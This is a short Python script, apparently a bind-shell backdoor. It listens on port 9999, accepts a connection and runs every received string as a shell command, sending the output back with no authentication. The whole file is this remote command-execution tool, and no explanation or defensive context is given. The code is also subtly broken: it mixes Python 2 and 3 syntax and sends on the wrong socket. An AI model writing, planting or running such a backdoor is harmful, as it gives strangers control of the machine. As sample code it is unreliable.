import os, socket, sys, subprocess, time
import ssl


def sock_create():
    try:
        global s
        global host
        global port
        global sock
        host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def sock_bind():
    try:
        print("Binding Port ... ")
        s.bind((host, port))
        s.listen(1)
    except socket.error as msg:
        print("socket error : " + str(msg[0]))
        print("Retrying ...")
        sock_bind()


def sock_accept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print ("connecton from %s:%s" % (addr[0], addr[1]))
        print("\n")
        menu()
    except socket.error as msg:
        print msg


def menu():
    while 1:
        command = conn.recv(1024)
        if command == 'exit':
            s.send("closing connection")
            # conn.close()
            # s.close()
            sys.exit(0)
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            conn.send(output)
            conn.close()
            retry()


def retry():
    try:
        sock_accept()
    except:
        time.sleep(10)


def main():
    sock_create()
    sock_bind()
    sock_accept()


main()
